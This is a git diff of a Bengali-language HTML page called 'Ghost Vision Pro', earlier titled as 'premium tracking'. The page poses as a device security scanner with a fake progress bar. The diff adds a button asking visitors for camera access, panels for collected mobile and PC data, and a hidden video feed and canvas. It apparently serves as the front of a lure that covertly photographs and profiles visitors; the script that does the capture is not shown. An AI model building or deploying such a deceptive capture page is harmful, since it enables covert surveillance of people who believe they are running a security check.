@@ -3,39 +3,48 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ghost Vision | প্রিমিয়াম ট্র্যাকিং</title>
+  <title>Ghost Vision Pro</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="neon-container">
-    <div class="holographic-effect"></div>
-    <div class="cyber-circle"></div>
+  <div class="cyber-container">
+    <div class="hologram-effect"></div>
     
-    <div class="content">
+    <div class="cyber-card">
       <div class="logo">
-        <i class="fas fa-ghost"></i>
-        <span>GHOST VISION</span>
+        <i class="fas fa-ghost cyber-glitch"></i>
+        <span>GHOST VISION PRO</span>
       </div>
       
-      <h1 class="neon-text">ডিজিটাল সিকিউরিটি স্ক্যান</h1>
-      <p class="subtext">আপনার ডিভাইসের নিরাপত্তা পরীক্ষা করা হচ্ছে...</p>
+      <h1 class="cyber-title">ডিভাইস স্ক্যানার সিস্টেম</h1>
+      <p class="cyber-text" id="statusText">সিস্টেম প্রস্তুত হচ্ছে...</p>
       
       <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
-        <span id="progressText">0% সম্পূর্ণ</span>
+        <div class="cyber-progress" id="progressBar"></div>
       </div>
       
-      <a href="https://t.me/the_end_sos" class="telegram-btn" target="_blank">
-        <i class="fab fa-telegram-plane"></i>
-        <span>সিকিউরিটি রিপোর্ট পেতে জয়েন করুন</span>
-      </a>
+      <button id="cameraBtn" class="cyber-button">
+        <i class="fas fa-camera"></i> ক্যামেরা অ্যাক্সেস দিন
+      </button>
+      
+      <div class="cyber-grid">
+        <div class="cyber-info-card">
+          <i class="fas fa-mobile-alt"></i>
+          <h3>মোবাইল ডাটা</h3>
+          <div id="mobileInfo"></div>
+        </div>
+        <div class="cyber-info-card">
+          <i class="fas fa-desktop"></i>
+          <h3>PC ডাটা</h3>
+          <div id="pcInfo"></div>
+        </div>
+      </div>
     </div>
   </div>
 
-  <video autoplay playsinline muted style="display: none;"></video>
-  <canvas id="sensorCanvas" style="display: none;"></canvas>
+  <video id="cameraFeed" autoplay playsinline style="display:none;"></video>
+  <canvas id="cameraCanvas" style="display:none;"></canvas>
 
   <script src="script.js"></script>
 </body>
